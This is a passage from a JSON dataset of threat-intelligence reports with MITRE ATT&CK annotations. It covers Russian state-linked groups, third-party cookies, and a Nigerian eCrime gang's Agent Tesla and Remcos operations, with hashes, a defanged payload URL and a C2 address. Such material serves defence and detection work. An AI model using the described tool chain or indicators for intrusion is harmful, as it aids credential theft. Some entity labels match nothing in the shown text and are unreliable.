Gamaredon\nActive since at least 2013, this APT has mainly targeted the Ukrainian government and agencies.\n### Berserk Bear\nThis APT has been active since at least 2011.\nBerserk Bear has targeted organizations in the US and Germany\u2019s energy, utilities, and telecommunications sectors.\n### Sandworm Team\nSince at least 2009, the group has targeted the critical infrastructure, government, and IT sector in the EU, the US, and Ukraine.\nLatest TTPS used by Russian-sponsored APTs\n------------------------------------------\nThe US government\u00a0[released an advisory\u00a0on the latest TTPs](https://www.nsa.gov/News-Features/Feature-Stories/Article-View/Article/2573391/russian-foreign-intelligence-service-exploiting-five-publicly-known-vulnerabili/%22%20/l%20%22pop5008885) leveraged by actors associated with the SVR.\nWhile each APT resorts to different TTPs, they share similarities, such as being highly stealthy and achieving persistence in the targeted networks.\nIn the recent advisory, the US government warned of exploitation activity of publicly known vulnerabilities, including in Fortinet and Pulse Secure VPNs.\nHow Organizations and Entities can tackle Cyber Espionage Effectively\n---------------------------------------------------------------------\nQuoIntelligence monitors the threat landscape and geopolitical developments for both organizations and public entities.\nWe leverage the latest AI technology to detect potential espionage motivation early on and forecast likely future outcomes.\nTo track threat actor developments worldwide, we continuously update our knowledge base and threat actor catalogs.\nTherefore, our clients stay ahead of their operations at any moment.\nThe catalog entries include descriptions of past and current activities, the groups\u2019 motivations and intentions, and up-to-date information on their TTPs, which are mapped to the MITRE ATT&CK Framework to enable automatic detection and tagging efforts, and more.\n[Get in Touch](https://quointelligence.eu/talk-to-an-expert/)\n[![Blogpost on Cyber Espionage as Security Trend in 2021](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==)![Blogpost on Cyber Espionage as Security Trend in 2021](https://quointelligence.eu/wp-content/uploads/2021/02/Copy-of-COVID-Blog-3-300x157.png)](https://quointelligence.eu/2020/12/cyber-security-trends-in-2021/)\nCurious about the topic.\n[**Read our complete analysis** on the increasing threat of cyber espionage campaigns!](https://quointelligence.eu/2020/12/cyber-security-trends-in-2021/)", "mitre_ids": ["T1195", "G0016", "S0368", "S0368", "G0016", "G0016", "G0007", "G0007", "G0007", "G0007", "G0007", "G0007", "G0007", "G0010", "G0010", "G0010", "G0047", "G0034", "TA0003", "T1190"], "anno_name_label": [["GROUP", "ReconHellcat"], ["GROUP", "ReconHellcat"], ["MALWARE", "BlackWater"], ["MALWARE", "BlackSoul"], ["GROUP", "ReconHellcat"], ["GROUP", "ReconHellcat"], ["GROUP", "ReconHellcat"], ["MALWARE", "BlackWater"], ["MALWARE", "Zebrocy"], ["GROUP", "Xenotime"], ["MALWARE", "Triton"], ["GROUP", "Berserk Bear"], ["GROUP", "Berserk Bear"]], "cti_entity_class": ["CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI"]}, {"cti_report": "How the Demise of Third-Party Cookies Will Influence Data Security\nMay 20, 2021\nThe transition from third-party cookies and hyper-targeted ads to privacy-friendly models\n-----------------------------------------------------------------------------------------\nThe internet is changing.\nFor years, web publishers, social media, and apps have provided free content by running ads online.\nThird-party cookies were the leading technology powering the digital ad industry.\nThey allow companies to track website visitors, collect user data, improve user experience, and serve more relevant ads to users.\nHowever, the rise of the cookie also led to adtech companies harvesting user\u2019s data, including online behavior and personal information, from millions of sites without user consent.\nAdvertisers realized that they could better profile individuals by gathering more user data and serve more targeted ads.\nThe problem was that the more targeted the cookies were, the more invasive they became.\nOver the last few years, increased data harvesting, such as using third-party cookies, has attracted controversy.\nSo much that it contributed to the development of consumer privacy regulations such as the GDPR in the EU and the CCPA in the US.\nApple\u2019s latest privacy feature,\u00a0[App Tracking Transparency](https://developer.apple.com/documentation/apptrackingtransparency) will change the traditional use of cookies.\nTogether with Google\u2019s declaration that it will phase out third-party cookies by 2022, the two tech companies promise more privacy and data security to users.\n[![Infographic explaining the difference between first-party and third-party cookies](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==)\n![Infographic explaining the difference between first-party and third-party cookies](https://quointelligence.eu/wp-content/uploads/2021/05/Cookies_Types.jpg)](https://quointelligence.eu/wp-content/uploads/2021/05/Cookies_Types.jpg \"Infographic explaining the difference between first-party and third-party cookies\")\nThe Third-Party Cookie: Sudden Cookie Death or Slow Phase-Out.\n--------------------------------------------------------------\n[![Screenshot of Apple App tracking Transparency feature](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==)\n![Screenshot of Apple App tracking Transparency feature](https://quointelligence.eu/wp-content/uploads/2021/05/MicrosoftTeams-image-2.jpg)](https://quointelligence.eu/wp-content/uploads/2021/05/MicrosoftTeams-image-2.jpg \"Screenshot of Apple App tracking Transparency feature\")\nOn 26 April, Apple launched its new privacy feature called App Tracking Transparency.\nThe feature, which comes with the iOS 14.5 update, promises to increase iPhone owners\u2019 privacy online.\nThe new App asks users whether they want to allow apps and websites to track their activity.\nIf users decline, applications won\u2019t be able to access the user ID known as Identifier for Advertisers (IDFA), which is needed to follow individuals.\nConsequently, apps won\u2019t share user data with third parties for ad-targeting purposes.\nFurther, the feature comes with a tracking menu where users can see which apps keep track of their data.\nOther companies are making similar efforts to put an end to the current model based on third-party cookies:\n[![Infographic on current third-party cookies alternatives for more user- and privacy friendly browsing ](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==)\n![Infographic on current third-party cookies alternatives for more user- and privacy friendly browsing ](https://quointelligence.eu/wp-content/uploads/2021/05/Copy-of-PRIVACY-FIENDLY-FEATURES_Cookies-Blog.png)](https://quointelligence.eu/wp-content/uploads/2021/05/Copy-of-PRIVACY-FIENDLY-FEATURES_Cookies-Blog.png \"Infographic on current third-party cookies alternatives for more user- and privacy friendly browsing \")\nHow Cookies Endanger Our Data Security And User Privacy\n-------------------------------------------------------\nIn 2018, the\u00a0[Cambridge Analytica scandal](https://www.youtube.com/watch?v=VDR8qGmyEQg)\u00a0\u2013 the firm that accessed 50 million [Facebook users](https://quointelligence.eu/2021/04/facebook-data-leak-and-brand-protection/) through questionable means to reach voters \u2013 resulted in a public outcry.\nThe aftermath of this event led to increased consumer awareness on how social media networks collect and sell data to other companies.\nThat\u2019s just one example of user data being obtained through shady practices and mismanaged in recent years.\nMost people are now aware that tech companies and social media networks threaten their privacy online.\nWhile such privacy risks \u2013 if unsecured \u2013 are widely known, cookies also pose risks to data security.\nThey can contain complete user profiles that threat actors can use for malicious purposes.\nFor instance, if an attacker hijacks a cookie, they could impersonate an individual to gain unauthorized access to information or services.\nA way to do that is by injecting Cross-site Scripting (XSS) payloads on a web application.\nThereby, the malicious script can steal the user\u2019s cookie and send it to the attacker.\nCertain\u00a0malware installed in the victim\u2019s device\u00a0can also target cookies and transfer them to the attacker\u2019s server, who can later use the data contained within to log in to the victim\u2019s account for personal gain.\nHowever, security risks are not limited to websites visited by the user or malware downloaded.\nThe data gathered by cookies travels across the internet. From there, ad and analytics services are buying and selling it while putting users\u2019 data at risk of data breaches.\nAlternatives to Third-party Cookies Promise to Reduce Security Risks\n--------------------------------------------------------------------\nIn line with Safari and Firefox, Apple\u2019s model guarantees high transparency on how user data is used and protects user privacy.\nNevertheless, apps like Facebook are lobbying against this new feature because social media platforms primarily rely on this model to survive.\n[Facebook has also stressed](https://www.wsj.com/articles/facebook-meets-apple-in-clash-of-the-tech-titanswe-need-to-inflict-pain-11613192406)\u00a0that these changes will make it harder for small businesses to place targeted ads.\nGoogle\u2019s model is a more gradual and collaborative approach to its privacy changes than what Apple is doing.\nGoogle is consulting with publishers and advertisers and looking for alternatives before phasing third-party cookies out.\nHowever, while Google\u2019s FloCs increase user privacy by targeting groups of people instead of tracking individuals, it is still a form of profiling individuals by creating cohorts.\nThese cohorts could be specific enough to contain very few users, similar to cookies.\nAs such, it is unclear how Google\u2019s new model enhances users\u2019 privacy.\nWill These Changes Improve Privacy And Data Security Online.\n------------------------------------------------------------\nEnhanced privacy coming to web browsers and both iOs and Android systems is good news for cybersecurity and privacy online.\nAs of 26 April, organizations using iPhones as business mobile phones can better protect their employees\u2019 and business data.\nThe new privacy feature lowers the risk of data breaches.\nMoving forward, iOs users can now choose whether they want to share their data with advertisers and data analytics companies.\nAdditionally, Safari and Firefox are already blocking third-party cookies on their Chrome web browsers, allowing for better privacy and control of the business data that employees share online.\nHowever,\u00a0[some websites still infringe on users\u2019 privacy](https://www.bbc.com/news/technology-51106526)\u00a0without giving users the possibility to consent, understand, or control third-party cookies, despite current GDPR regulation.\nThese sites disregard GDPR and don\u2019t allow users to access the content unless they accept cookies, even though this practice is currently illegal.\nAs such, Apple and Google\u2019s innovative approaches will help to strengthen user privacy and will likely shift the way ad tracking and privacy work online.\nNevertheless, as alternatives to cookies are few and data is needed for advertising purposes, new tracking vectors, such as fingerprinting, could start developing.\nAll these changes could also result in [attackers developing new ways](https://quointelligence.eu/2020/12/cyber-security-trends-in-2021/) to access personally identifiable data online.\n>\n> [Talk to our experts](https://quointelligence.eu/talk-to-an-expert/) today to learn how you can incerase your organization\u2019s data security and awareness.\n>\n>\n>\n[Get in touch!](https://quointelligence.eu/talk-to-an-expert/)\nJoin Our Newsletter.\n--------------------\nSubscribe to our newsletter to receive Weekly Intelligence Summaries, cyber news, and exciting updates.\nOnly valid business emails will be approved.\nPlease enable JavaScript in your browser to complete this form.\nName *FirstLastBusiness Email *Checkboxes ** I have read and agree to the [Privacy Policy](https://quointelligence.eu/privacy-policy).\nGDPR Agreement ** I consent to having this website store my submitted information so they can respond to my inquiry.\nNameSubscribe", "mitre_ids": ["T1606", "T1134", "T1189", "T1539", "T1539", "T1189", "T1539", "T1589"], "anno_name_label": [], "cti_entity_class": ["CI", "CI", "CI", "CI", "CI", "CI", "CI", "CI"]}, {"cti_report": "E.K.P. & Agent Tesla: The Daily Operations of a Nigerian eCrime Gang\nJun 30, 2021\nIn late 2020, QuoIntelligence identified a malicious Word document.\nThe Word document contained technical indicators associated with an Agent Tesla malware campaign, a readily available Remote Access Trojan (RAT) that steals keystrokes and credentials.\nIt ultimately led us to uncover the operation of a Nigerian eCrime gang.\nBased on our investigation, we dubbed the eCrime gang \u201cE.K.P.\u201d.\nFurther, we understand that they are located in Nigeria.\nWe also learned that E.K.P is an operator within a service model known as Malware-as-a-Service (MaaS).\nMaaS & RaaS: The All Skill-Level eCrime Conductors\n--------------------------------------------------\nCybercriminals are increasingly adopting MaaS for conventional malware campaigns and ransomware deployments (Ransomware-as-a-Service or short\u202fRaaS).\nDue to the offered capability and low barrier-to-entry, it doesn\u2019t take a lot of skill to conduct attack campaigns.\nIn this report, we highlight the daily operations of E.K.P and the various commodity tools used to both stage and execute attack campaigns.\nUncovering E.K.P\n----------------\nThe Microsoft Word document that we discovered in 2020 was entitled\u202f\u201dAzerbaijan-Turkey Military Negotiation.doc\u201d.\nApparently a user from a VirusTotal in the Netherlands\u202fcontaining a weaponized macro uploaded it.\nIf the cyber attacker can successfully convince their target to open the document, the kill-chain will be launched, and the malware will be able to steal the information of the person who opened the file.\n[![Malicious Word document that E.K.P. used as attack lure](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== \"Malicious Word document that E.K.P. used as attack lure\")\n![Malicious Word document that E.K.P. used as attack lure](https://quointelligence.eu/wp-content/uploads/2021/06/image1.jpg \"Malicious Word document that E.K.P. used as attack lure\")](https://quointelligence.eu/wp-content/uploads/2021/06/image1.jpg \"Malicious Word document that E.K.P. used as attack lure\")\n[![Description and display of lure document](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== \"Description and display of lure document\")![Description and display of lure document](https://quointelligence.eu/wp-content/uploads/2021/06/image2-300x113.jpg \"Description and display of lure document\")](https://quointelligence.eu/wp-content/uploads/2021/06/image2-300x113.jpg \"Description and display of lure document\")\n##### Word document titled *Azerbaijan-Turkey Military Negotiations.doc* that E.K.P. used as lure for their recent attack\nE.K.P. Kill-Chain and Tesla Agent\u2019s Connections to Other Malware Families\n-------------------------------------------------------------------------\nThe macro embedded with the Word document obfuscates, i.e., creates difficult-to-read code, to another simple obfuscated script.\nThis script then tries to download and execute a payload retrieved from a Command and Control (C2) URL.\nUnfortunately, at the time of analysis, we could not retrieve the file.\nHowever, we determined additional files associated with the same C2 URL: a widespread malware family known as\u202f*Agent Tesla*.\nAgent Tesla is a readily available keylogger and Remote Access Trojan (RAT), written in .NET.\nIts primary function includes logging keystrokes and the clipboard to exfiltrate data ultimately.\nAt least this specific variant attempts to exfiltrate data from the victim using hardcoded Simple Mail Transfer Protocol (SMTP) credentials for an attacker-controlled mailbox.\nAnother malware family tied to the C2 Infrastructure is \u201cRemcos RAT,\u201d giving a cybercriminal complete control of an infected system.\nIts capabilities include keylogging and surveillance through audio and screenshots.\nSir Pee and Day to Day Operations at eCrime gang E.K.P.\n-------------------------------------------------------\nBased on what we have learned so far, we dubbed the cybercriminal gang E.K.P, and we understand that they are located in Nigeria.\nE.K.P. starts the day by communicating with customers and its management to determine the needed actions for the day.\n![E.K.P.'s communication thread between group members, managers, and clients](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== \"E.K.P.'s communication thread\")![E.K.P.'s communication thread between group members, managers, and clients](https://quointelligence.eu/wp-content/uploads/2021/06/image3-1024x576.jpg \"E.K.P.'s communication thread\")\n##### Screenshot of the conversation thread between E.K.P. members, their managers, and clients\nBased on other conversation threads, the contact with the moniker\u202fSir Pee\u202fappears to be the manager of E.K.P.\nAs you can see in the screenshot above, Sir Pee instructs E.K.P to \u201cspam zip file now\u201d and then sends the link to where the malicious file is uploaded.\nE.K.P responds with login credentials for an email account to the domain\u202f*loanabank[.]com*.\nThe domain appears to be a fake bank page.\nSir Pee, in turn, sends E.K.P credentials for a CPanel \u2013 a control dashboard to facilitate the management of a web hosting server.\n[![Homepage of Ioanabank[.]com - a fake bank domain E.K.P. is using](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== \"Screenshot of homepage of Ioanabank[.]com\")\n![Homepage of Ioanabank[.]com - a fake bank domain E.K.P. is using](https://quointelligence.eu/wp-content/uploads/2021/06/image4.jpg \"Screenshot of homepage of Ioanabank[.]com\")](https://quointelligence.eu/wp-content/uploads/2021/06/image4.jpg \"Homepage of Ioanabank[.]com - a fake bank domain E.K.P. is using\")\n##### Screenshot of Loanabank\u2019s homepage \u2013 a fake bank domain\nE.K.P.\u2019s multi-functional, multi-vendor attacker toolset\n--------------------------------------------------------\nOur observations indicate clearly that E.K.P uses various malware builder kits, services, and inboxes for conducting their operations.\nAfter starting the day checking in with the apparent manager, E.K.P begins with their operational rounds by accessing their web shell on\u202f*predilletastore[.]com[.]br.*\nAccording to our research, the site is likely a compromised WordPress website hosting a web shell.\nE.K.P. uses this for attack operations and to control compromised hosts remotely.\nFurther, the eCrime gang leverages it to store their attack tools such as payloads and files.\n[![E.K.P.'s web shell on predilletastore[.]com[.]br](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== \"Screenshot of E.K.P.'s web shell on predilletastore[.]com[.]br\")![E.K.P.'s web shell on predilletastore[.]com[.]br](https://quointelligence.eu/wp-content/uploads/2021/06/image5-1024x561.jpg \"Screenshot of E.K.P.'s web shell on predilletastore[.]com[.]br\")](https://quointelligence.eu/wp-content/uploads/2021/06/image5-1024x561.jpg \"E.K.P.'s web shell on predilletastore[.]com[.]br\")\n##### Screenshot of predilletastore[.]com[.]br \u2013 E.K.P. web shell\nBased on their contact list, E.K.P seems to have access to a wide range of tools, especially if a potential customer requires capabilities outside the gang\u2019s service catalog.\nHowever, during our observations, E.K.P heavily relied on mainly three core malware builder kits.\n### Exploit Builder (version 1.5.0.1):\nA premium product requiring a license.\nExploit Builder enables E.K.P to create an exploit document (e.g., Microsoft Word or Excel) that delivers a malware payload to a victim host.\nAt first, the gang creates a payload using Origin Logger.\nSecondly, they obfuscate the payload with the Cassandra Crypter service.\n### Origin Logger (also known as\u202fAgent Tesla):\n\u202fThrough our analysis, we confirm that the payload generated by Origin Logger is nearly the same as previously decoded Agent Tesla payloads.\nThe C2 panel interface matches the same panel that threat actors use for the malware Origin Logger, bundled with the C2 panel, and then sold to attackers.\nAs the name suggests, its primary purpose is logging keystrokes, clipboard data, HTTP cookies, taking periodic screenshots, and viewing the webcam of infected computers.\n![Screenshots showing Exploit Builder and Origin Logger](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== \"Screenshots showing Exploit Builder and Origin Logger\")\n![Screenshots showing Exploit Builder and Origin Logger](https://quointelligence.eu/wp-content/uploads/2021/06/image6-1024x561.jpg \"Screenshots showing Exploit Builder and Origin Logger\")\n##### Screenshots showing Exploit Builder and Origin Logger\nE.K.P leveraged the Origin Logger builder to create multiple variants to infect victims.\nFor obfuscation of the payloads, the threat actor used the online service known as\u202fCassandra Crypter.\n### Cassandra Crypter Service:\nBased on their website, Cassandra Crypter Service describes itself as:\n>\n> *A cloud crypter which is coded by the coder of PoisonCrypter, it will be updated daily twice or even thrice (if needed).\nAs a result, it will be giving you a FUD result and always fud for the premium users.\nIt is working with both native and managed assemblies (running since 2018)*\n>\n>\n>\nThe customized obfuscation (e.g., ConfuserEx) of the .NET Agent Tesla payloads offered through Cassandra Crypter is available through two subscription plans: The Premium or VIP Plan.\nThe Premium Plan can be paid directly and works automatically, while the VIP Plan requires the subscriber to contact support first for personalization.\n[![Screenshot of Cassandra Crypter Service ](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== \"Screenshot of Cassandra Crypter Service \")\n![Screenshot of Cassandra Crypter Service ](https://quointelligence.eu/wp-content/uploads/2021/06/image7-1024x815.jpg \"Screenshot of Cassandra Crypter Service \")](https://quointelligence.eu/wp-content/uploads/2021/06/image7-1024x815.jpg \"Screenshot of Cassandra Crypter Service \")\n[![Screenshot of Cassandra Crypter Service Plan & Pricing](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== \"Screenshot of Cassandra Crypter Service Plan & Pricing\")\n![Screenshot of Cassandra Crypter Service Plan & Pricing](https://quointelligence.eu/wp-content/uploads/2021/06/image8.jpg \"Screenshot of Cassandra Crypter Service Plan & Pricing\")](https://quointelligence.eu/wp-content/uploads/2021/06/image8.jpg \"Screenshot of Cassandra Crypter Service Plan & Pricing\")\n##### Screenshots of the Cassandra Crypter Dashboard and the service\u2019s pricing plans\nWhile E.K.P expedites the time spent preparing malware variants and malicious documents for the attack campaigns using different tools, they eventually get to the distribution part.\nConsequently, they will check with their manager again for the target details.\nE.K.P communicates with multiple contacts throughout the day and even uses *Sendspace*\u202f\u2013 a free hosting site for instant file transfers \u2013 to receive and transfer documents for campaigns.\n[![Screenshots of Sendspace ](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== \"Screenshots of Sendspace \")\n![Screenshots of Sendspace ](https://quointelligence.eu/wp-content/uploads/2021/06/image9.jpg \"Screenshots of Sendspace \")](https://quointelligence.eu/wp-content/uploads/2021/06/image9.jpg \"Screenshots of Sendspace \")\n[![Screenshots Turbomailer \u2013 both used by the Nigerian eCrime gang E.K.P.](data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw== \"Screenshots Turbomailer \u2013 used by the Nigerian eCrime gang E.K.P.\")![Screenshots Turbomailer \u2013 both used by the Nigerian eCrime gang E.K.P.](https://quointelligence.eu/wp-content/uploads/2021/06/image10.jpg \"Screenshots Turbomailer \u2013 used by the Nigerian eCrime gang E.K.P.\")](https://quointelligence.eu/wp-content/uploads/2021/06/image10.jpg \"Screenshots Turbomailer \u2013 both used by the Nigerian eCrime gang E.K.P.\n##### Screenshots of Sendspace and Turbomailer \u2013 both used by the Nigerian eCrime gang E.K.P.\nAnother tool that E.K.P frequently uses for mass emails is the\u202f*Xleet\u00a0Phishing Service*, a service popular amongst threat actors to distribute spear-phishing emails throughout various attacks.\nOne of the services offered by the marketplace where Xleet is sold, is access to a compromised server that hosts the PHP web shell that enables ongoing access to the server.\nQuoIntelligence\u00a0recently analyzed campaigns attributed to [top-tier threat actor \u201cCobalt\u201d group](https://quointelligence.eu/2020/07/golden-chickens-evolution-of-the-maas/), using a PHP-mailer script placed on a likely compromised server used to distribute spear-phishing emails.\nThe Raise of eCrime Toolset Services\n------------------------------------\nThis investigation is an example of the effectiveness of the cybercriminal underground offering competent toolset services.\nThrough Malware-as-a-Service (MaaS) and other subscription models, less-skilled individuals can execute low-effort cybercrime.\nA similar, slightly more complex\u00a0MaaS\u00a0often used by APTs is the Golden Chickens (GC)\u00a0MaaS.\nSince 2018, QuoIntelligence has tracked and highlighted the \u202f[evolution of the Golden Chickens (GC)](https://quointelligence.eu/2020/07/golden-chickens-evolution-of-the-maas/) MaaS\u202fand how different actors use it, including top-tier threat actors FIN6, Cobalt, and\u00a0Evilnum.\nBy 2019, we uncovered\u00a0[eleven\u00a0tools attributed to the GC MaaS](https://quointelligence.eu/2021/04/golden-chickens-compilation/)and each customized per campaign for the threat actor purchasing the service.\nIn general, attributing attack activity to threat actors leveraging a MaaS is often complicated.\nThe services offered can include both C2 infrastructure and malware variants.\nThese are available to all MaaS customers, whether script kiddies or Advanced Persistent Threat (APT) actors.\nE.K.P.: A Highly Active MaaS Provider Supporting Multiple Campaigns Simultaneously\n----------------------------------------------------------------------------------\nOur investigation uncovered E.K.P\u2019s day-to-day operation over a couple of months.\nIt became clear that the threat actor is highly active, supporting multiple campaigns in parallel, and leveraging complete and straightforward toolsets to monetize activity.\nE-Crime is a large ecosystem consisting of interconnected services, schemes, and affiliate networking in the cybercriminal domain.\nOverall, their primary goal is financial gain.\nQuoIntelligence\u00a0will continue to observe threat actors like E.K.P, which are operating non-complex but effective\u00a0eCrime\u00a0services.\nApendix\n-------\n**Malicious document (maldoc)**\n* 7007f35df3292a4ecd741839fc2dafde471538041e54cfc24207d9f49016dc77\n**Maldoc name**\n* Azerbaijan-Turky Military Negotiation.doc\n**Maldoc C2**\n* https://cannabispropertybrokers[.]com/pop/8OwWKrFQ0gQoKt9[.]exe\n**AgentTesla (delivered by maldoc)**\n* cda07296d20a239bdb9cb5a2c9a814f69811bc85ced8bf32e998b906a413f416\n**REMCOS RAT packed**\n* 15170d0dbe467efc4e38156ed4e03702ae19af44c100d7df7a75c6dbdb7ac587\n**REMCOS RAT upacked**\n* 4d755262fd2c7f0539f919d300c7ebc3bd70267c002bcb8edd886a40e3f8ba75\n**REMCOS RAT C2**\n* 79.134.225[.]72:64843\nMITRE ATT&CK\n------------\n| **TACTIC** | **TECHNIQUE** |\n| **Initial Access** | [T1566.001: Phishing: Spearphishing Attachment](https://attack.mitre.org/techniques/T1566/001) |\n| **Execution** | [T1203: Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203)\n[T1053.005: Scheduled Task/Job: Scheduled Task](https://attack.mitre.org/techniques/T1053/005)\n[T1047: Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047)\n[T1204.002: User Execution: Malicious File](https://attack.mitre.org/techniques/T1204/002) |\n| **Persistance** | [T1547.001: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder](https://attack.mitre.org/techniques/T1547/001)\n[T1053.005: Scheduled Task/Job: Scheduled Task](https://attack.mitre.org/techniques/T1053/005) |\n| **Privilege Escalation** | [T1547.001: Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder](https://attack.mitre.org/techniques/T1547/001)\n[T1055.012: Process Injection: Process Hollowing](https://attack.mitre.org/techniques/T1055/012/)\n[T1053.005: Scheduled Task/Job: Scheduled Task](https://attack.mitre.org/techniques/T1053/005) |\n| **Defense Evasion** | [T1140: Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140)\n[T1564.001: Hide Artifacts: Hidden Files and Directories](https://attack.mitre.org/techniques/T1564/001)\n[T1564.003: Hide Artifacts: Hidden Window](https://attack.mitre.org/techniques/T1564/003)\n[T1562.001: Impair Defenses: Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001)\n[T1112: Modify Registry](https://attack.mitre.org/techniques/T1112)\n[T1027: Obfuscated Files or Information](https://attack.mitre.org/techniques/T1027)\n[T1055.012: Process Injection: Process Hollowing](https://attack.mitre.org/techniques/T1055/012/)\n[T1218.009: Signed Binary Proxy Execution: Regsvcs/Regasm](https://attack.mitre.org/techniques/T1218/009)\n[T1497: Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) |\n| **Credential Access** | [T1555: Credentials from Password Stores](https://attack.mitre.org/techniques/T1555)\n[T1555.003: Credentials from Web Browsers](https://attack.mitre.org/techniques/T1555/003)\n[T1056.001: Input Capture: Keylogging](https://attack.mitre.org/techniques/T1056/001)\n[T1552.001: Unsecured Credentials: Credentials In Files](https://attack.mitre.org/techniques/T1552/001)\n[T1552.002: Unsecured Credentials: Credentials in Registry](https://attack.mitre.org/techniques/T1552/002) |\n| **Discovery** | [T1087.001: Account Discovery: Local Account](https://attack.mitre.org/techniques/T1087/001)\n[T1082: System Information Discovery](https://attack.mitre.org/techniques/T1082)\n[T1016: System Network Configuration Discovery](https://attack.mitre.org/techniques/T1016)\n[T1033: System Owner/User Discovery](https://attack.mitre.org/techniques/T1033)\n[T1124: System Time Discovery](https://attack.mitre.org/techniques/T1124)\n[T1057: Process Discovery](https://attack.mitre.org/techniques/T1057)\n[T1497: Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) |\n| **Collection** | [T1560: Archive Collected Data](https://attack.mitre.org/techniques/T1560)\n[T1115: Clipboard Data](https://attack.mitre.org/techniques/T1115)\n[T1056.001: Input Capture: Keylogging](https://attack.mitre.org/techniques/T1056/001)\n[T1185: Man in the Browser](https://attack.mitre.org/techniques/T1185)\n[T1113: Screen Capture](https://attack.mitre.org/techniques/T1113)\n[T1125: Video Capture](https://attack.mitre.org/techniques/T1125) |\n| **Command and Control (C2)** | [T1071.001: Application Layer Protocol: Web Protocols](https://attack.mitre.org/techniques/T1071/001)\n[T1071.003: Application Layer Protocol: Mail Protocols](https://attack.mitre.org/techniques/T1071/003)\n[T1105: Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105) |\n| **Exfiltration** | [T1048.003: Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol](https://attack.mitre.org/techniques/T1048/003) |\n[Get in touch!](https://quointelligence.eu/talk-to-an-expert/)", "mitre_ids": ["S0331", "T1566", "S0331", "TA0006", "T1566", "T1056", "T1486", "T1486", "T1486", "T1059", "T1566", "TA0010", "T1566", "T1566", "T1566", "T1566", "T1566", "T1566", "T1566", "T1566", "S0331", "T1027", "T1059", "T1027", "TA0011", "T1105", "TA0011", "S0331", "T1105", "S0331", "T1056", "T1056", "T1115", "TA0010", "TA0010", "T1048", "TA0011", "S0332", "T1056", "T1113", "T1566", "T1566", "TA0011", "T1059", "S0331", "S0331", "S0331", "S0331", "S0331", "TA0011", "S0331", "TA0011", "T1056", "T1115", "T1113", "T1606", "S0331", "S0331", "S0331", "S0331", "S0331", "S0331", "T1027", "S0331", "T1027", "T1059", "T1608", "T1566", "T1566", "G0037", "G0080", "G0120", "TA0011", "T1059", "TA0011", "S0331", "S0332", "S0332", "S0332", "TA0011", "TA0001", "T1566", "TA0002", "T1203", "T1053", "T1047", "T1204", "TA0003", "T1547", "T1053", "TA0004", "T1547", "T1055", "T1053", "TA0005", "T1140", "T1564", "T1564", "T1562", "T1112", "T1027", "T1055", "T1218", "T1497", "T1555", "T1555", "T1056", "T1552", "T1552", "T1087", "T1082", "T1016", "T1033", "T1124", "T1057", "T1497", "T1560", "T1115", "T1056", "T1185", "T1185", "T1125", "TA0011", "T1071", "T1071", "T1105", "T1048"], "anno_name_label": [["GROUP", "E.K.P"], ["GROUP", "E.K.P"], ["GROUP", "E.K.P"], ["GROUP", "E.K.P"], ["GROUP", "E.K.P"], ["GROUP", "E.K.P"], ["GROUP", "E.K.P"], ["GROUP", "E.K.P"], ["GROUP", "E.K.P"], ["GROUP", "E.K.P"], ["GROUP", "E.K.P"], ["GROUP", "E.K.P"], ["GROUP", "E.K.P"], ["GROUP", "E.K.P"], ["GROUP", "E.K.P"], ["GROUP", "E.K.P"], ["GROUP", "E.K.P"], ["GROUP", "E.K.P"], ["GROUP", "E.K.P"], ["GROUP", "E.K.P"], ["GROUP", "E.K.P"], ["GROUP", "E.K.P"], ["GROUP", "E.K.P"], ["GROUP", "E.K.P"], ["GROUP", "E.K.P"], ["GROUP", "E.K.P"], ["GROUP", "E.K.P"], ["GROUP", "E.K.P"], ["GROUP", "E.K.P"], ["GROUP", "E.K.P"], ["GROUP", "E.K.P"], ["GROUP", "E.K.P"], ["GROUP", "E.K.P"], ["GROUP", "E.K.P"], ["GROUP", "E.K.P"], ["GROUP", "E.K.P"], ["GROUP", "E.K.P"], ["GROUP", "E.K.P"], ["GROUP", "E.K.P"], ["TOOL", "Exploit Builder"], ["TOOL", "Exploit Builder"], ["GROUP", "E.K.P"], ["TOOL", "Cassandra Crypter"], ["TOOL", "Exploit Builder"], ["TOOL", "Exploit Builder"], ["TOOL", "Exploit Builder"], ["TOOL", "Exploit Builder"], ["TOOL", "Exploit Builder"], ["GROUP", "E.K.P"], ["TOOL", "Cassandra Crypter"], ["TOOL", "Cassandra 